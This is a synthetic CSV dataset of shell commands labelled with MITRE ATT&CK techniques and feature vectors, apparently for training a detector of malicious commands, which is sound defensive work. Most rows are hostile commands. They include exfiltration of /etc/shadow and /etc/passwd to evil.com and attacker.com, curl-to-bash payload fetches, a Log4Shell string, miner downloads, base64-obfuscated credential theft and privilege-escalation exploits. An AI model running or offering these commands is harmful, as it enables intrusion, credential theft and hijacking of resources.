command,features,label,source
regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1218_System_Binary_Proxy_Execution'],synthetic
sudo curl 'http://target.com/search?q=${jndi:ldap://attacker.com/a}',"[0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1190_Exploit_Public_Facing_Application'],synthetic
su - admin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo 'bmV0IHVzZXIgL2RvbWFpbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"nuclei -u http://target.com -t cves/ -severity critical,high","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1190_Exploit_Public_Facing_Application'],synthetic
nohup last -n 10 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
echo 'bmNyYWNrIC1wIDIyIC0tdXNlciByb290IC1QIHBhc3MubHN0IDEwLjAuMC4x' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo echo 'R2V0LUl0ZW1Qcm9wZXJ0eSBIS0xNOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1012_Query_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
iodine -f -P password dns.attacker.com,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1048_Exfiltration_Over_Alternative_Protocol'],synthetic
./frpc -c frpc.ini,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 1]",['T1219_Remote_Access_Software'],synthetic
"bash -c ""python3 eternalblue.py 10.0.0.5 | > /dev/null 2>&1""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]","['T1210_Exploitation_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Y2F0IC90bXAvZW5jb2RlZCB8IHh4ZCAtciAtcCB8IGJhc2g=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
time getent passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1087_Account_Discovery'],synthetic
"nuclei -u http://target.com -t cves/ -severity critical,high","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1190_Exploit_Public_Facing_Application'],synthetic
"time nuclei -u http://target.com -t cves/ -severity critical,high","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1190_Exploit_Public_Facing_Application'],synthetic
sudo echo 'bWVkdXNhIC1oIDEwLjAuMC4xIC11IHJvb3QgLVAgL3RtcC9wYXNzd29yZHMudHh0IC1NIHNzaA==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
groups $(whoami) | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bm1hcCAtc1YgLS12ZXJzaW9uLWludGVuc2l0eSA1IC1wIDEtNjU1MzUgMTAuMC4wLjEgJiYgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'Z2NjIGV4cGxvaXQuYyAtbyBleHBsb2l0ICYmIC4vZXhwbG9pdA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
xargs -a /tmp/cmds.txt sh -c,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1202_Indirect_Command_Execution'],synthetic
import -window root /tmp/screenshot.png,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1113_Screen_Capture'],synthetic
ip addr show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
gnome-screenshot -f /tmp/grab.png,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1113_Screen_Capture'],synthetic
echo 'JGVudjpjbWQgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCdkd0JvQUc4QVlRQnRBR2tBJykp' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
Start-BitsTransfer -Source http://evil.com/shell.exe -Destination $env:TEMP,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1197_BITS_Jobs'],synthetic
nohup ansible -m shell -a 'curl http://evil.com | bash' all &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]",['T1072_Software_Deployment_Tools'],synthetic
echo 'Y2hpc2VsIHNlcnZlciAtLXBvcnQgODA4MCAtLXJldmVyc2U=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1219_Remote_Access_Software', 'T1027_Obfuscated_Files_or_Information']",synthetic
find /home -name '.env' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
nohup  ./ngrok  tcp  22  &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1219_Remote_Access_Software'],synthetic
hostnamectl,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
time arp-scan --localnet,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
secretsdump.py -just-dc-user Administrator domain/user:pass@DC,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
systemd-detect-virt,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1497_Virtualization_Sandbox_Evasion'],synthetic
wget --post-file=/etc/passwd http://attacker.com/receive,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
"time bash -c 'python3 -c import os;os.system(""id"")'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1218_System_Binary_Proxy_Execution'],synthetic
echo  'cmVnIGRlbGV0ZSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBEZWZlbmRlcg=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo useradd -m -s /bin/bash -G sudo newadmin ; chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 1]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -X POST http://evil.com/collect -d @/etc/shadow,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
cp /usr/bin/python3 /tmp/systemd,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1036_Masquerading'],synthetic
chage -l root | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 1]","['T1201_Password_Policy_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
locate *.pdf | xargs cp -t /tmp/loot/,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1005_Data_from_Local_System'],synthetic
"bash -c ""bash -c 'python3 -c import os;os.system(""id"")'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1218_System_Binary_Proxy_Execution'],synthetic
passwd -d root,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1098_Account_Manipulation'],synthetic
arecord -d 60 -f cd /tmp/audio.wav,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1123_Audio_Capture'],synthetic
nohup echo 'Z2V0ZW50IHBhc3N3ZCB8IGF3ayAtRjogJyQzID49IDEwMDAn' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""echo 'Z2RiIC1wICQocGdyZXAgc3NoZCkgLWJhdGNoIC1leCAnY2FsbCBzeXN0ZW0oIi90bXAvcGF5bG9hZCIpJw==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1055_Process_Injection', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl -sL http://evil.com/shell.sh -o /tmp/shell.sh && sleep 1,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1078_Valid_Accounts'],synthetic
"bash -c ""chage -l root""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1201_Password_Policy_Discovery'],synthetic
cat /etc/os-release,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
"bash -c ""sox -t alsa default /tmp/recording.wav trim 0 120 ; echo done""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 1, 0]","['T1123_Audio_Capture', 'T1059_Command_and_Scripting_Interpreter']",synthetic
regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll | sleep 1,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1218_System_Binary_Proxy_Execution', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup cp -r /home/user/.config/google-chrome/Default/Extensions /tmp/ | history -c &,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1176_Browser_Extensions', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time hostnamectl,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
bitsadmin /transfer myJob http://attacker.com/payload.exe %TEMP%\payload.exe,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1197_BITS_Jobs'],synthetic
time import -window root /tmp/screenshot.png | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1113_Screen_Capture', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
echo 'dGFyIC1jemYgL3RtcC9kYXRhLnRhci5neiAvaG9tZS8qL0RvY3VtZW50cw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1074_Data_Staged', 'T1027_Obfuscated_Files_or_Information']",synthetic
grep -rn 'password\|secret\|token' /etc/ /home/ 2>/dev/null > /tmp/secrets.txt,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.4, 0.32, 0, 0]",['T1119_Automated_Collection'],synthetic
echo 'dXNlcm1vZCAtYUcgc3VkbyBjb21wcm9taXNlZF91c2Vy' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'Y3AgL2Jpbi9iYXNoIC90bXAvc3NoZA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1036_Masquerading', 'T1027_Obfuscated_Files_or_Information']",synthetic
su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
python3 eternalblue.py 10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1210_Exploitation_Remote_Services'],synthetic
sh -c 'curl http://evil.com/shell.sh | bash',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
nohup echo 'd21pYyBvcyBnZXQgY2FwdGlvbix2ZXJzaW9u' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1047_Windows_Management_Instrumentation', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup du -sh /var/log &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
echo 'Y2F0IC9wcm9jL2NwdWluZm8gfCBncmVwIGh5cGVydmlzb3I=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1497_Virtualization_Sandbox_Evasion', 'T1027_Obfuscated_Files_or_Information']",synthetic
chmod  +x  /tmp/.hidden_payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1036_Masquerading'],synthetic
"bash -c ""echo 'c2FsdCAnKicgY21kLnJ1biAnY3VybCBodHRwOi8vZXZpbC5jb20gfCBiYXNoJw==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1072_Software_Deployment_Tools', 'T1027_Obfuscated_Files_or_Information']",synthetic
groups $(whoami) ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""sed -i 's/old/new/g' config.cfg""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['BENIGN'],synthetic
echo 'Z3JlcCAtcm4gJ3Bhc3N3b3JkXHxzZWNyZXRcfHRva2VuJyAvZXRjLyAvaG9tZS8gMj4vZGV2L251bGwgPiAvdG1wL3NlY3JldHMudHh0' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1119_Automated_Collection', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo wget -q -O- --header='X-Auth: token123' http://evil.com/cmd ; > /dev/null 2>&1,"[0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.44, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
"bash -c ""ansible -m shell -a 'curl http://evil.com | bash' all""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]",['T1072_Software_Deployment_Tools'],synthetic
sudo find / -name '*.conf' -readable 2>/dev/null | head -20,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.4, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
find  /  -name  '*.pem'  -exec  cp  {}  /tmp/loot  \;,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1074_Data_Staged'],synthetic
nohup echo 'aGVsbG8gd29ybGQ=' | base64 -d &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1140_Deobfuscate_Decode'],synthetic
echo 'cmVnIGV4cG9ydCBIS0xNXFNBTSBzYW0ucmVnICYmID4gL2Rldi9udWxsIDI+JjE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1012_Query_Registry', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
ansible -m shell -a 'curl http://evil.com | bash' all,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1072_Software_Deployment_Tools'],synthetic
cat /tmp/encoded | xxd -r -p,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1140_Deobfuscate_Decode'],synthetic
echo 'cHl0aG9uMyBhdXRvX2NvbGxlY3Rvci5weSAtLWRpcnMgL2hvbWUsL2V0YyAtLWV4dCBwZGYsZG9jeCxrZGJ4IDsgaGlzdG9yeSAtYw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1119_Automated_Collection', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'cHl0aG9uMyAtYyAiaW1wb3J0IGJhc2U2NDsgcHJpbnQoYmFzZTY0LmI2NGVuY29kZShvcGVuKCcvZXRjL3Bhc3N3ZCcsJ3JiJykucmVhZCgpKS5kZWNvZGUoKSki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1132_Data_Encoding', 'T1027_Obfuscated_Files_or_Information']",synthetic
"python3 -c ""import ctypes; ctypes.CDLL(None).system('/tmp/shell')""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1055_Process_Injection'],synthetic
"bash -c ""echo 'c3UgLSBhZG1pbg==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
net localgroup administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
ip neigh show && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
LD_PRELOAD=/tmp/evil.so /usr/bin/sudo whoami | > /dev/null 2>&1,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.2, 0.28, 1, 0]","['T1055_Process_Injection', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'calc.exe' && echo done &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.48, 1, 0]","['T1047_Windows_Management_Instrumentation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1496_Resource_Hijacking'],synthetic
id -Gn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
cat /etc/pam.d/common-password,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1201_Password_Policy_Discovery'],synthetic
echo 'd21pYyB1c2VyYWNjb3VudCBsaXN0ICYmIGNobW9kICt4IC90bXAvcGF5bG9hZA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'Y2F0IC9ldGMvc2hhZG93IHwgbmMgMTAuMC4wLjk5IDQ0NDQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
msiexec /quiet /i http://evil.com/payload.msi && echo done,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1218_System_Binary_Proxy_Execution', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo  'Y2F0IC9ldGMvbmV0d29yay9pbnRlcmZhY2Vz'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo wmic useraccount list,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1087_Account_Discovery'],synthetic
echo  'dW5hbWUgLWE='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
chisel server --port 8080 --reverse,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1219_Remote_Access_Software'],synthetic
Get-LocalGroupMember -Group Administrators ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 1]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find / -name '*.pem' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
nohup ncrack -p 22 --user root -P pass.lst 10.0.0.1 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1110_Brute_Force'],synthetic
systemd-detect-virt ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 1]","['T1497_Virtualization_Sandbox_Evasion', 'T1059_Command_and_Scripting_Interpreter']",synthetic
python3 decrypt_chrome_cookies.py --profile ~/.config/google-chrome/Default,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1176_Browser_Extensions'],synthetic
